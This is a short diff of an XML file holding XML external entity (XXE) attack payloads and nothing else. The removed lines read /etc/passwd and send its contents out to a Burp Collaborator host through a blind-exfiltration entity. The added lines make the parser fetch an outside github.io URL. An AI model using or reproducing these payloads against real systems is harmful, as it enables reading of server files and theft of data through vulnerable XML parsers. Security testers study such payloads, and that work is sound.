@@ -1,3 +1,4 @@
 <?xml version="1.0"?>
-<!ENTITY % xxe SYSTEM "file:///etc/passwd">
-<!ENTITY blind SYSTEM "https://o7wesqvt3qjq9jifqqdlm32vwm2eq3.burpcollaborator.net/?%xxe;">]><foo>&blind;</foo>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "https://naglinagli.github.io/DoD_Idor">]><foo>&xxe;</foo>
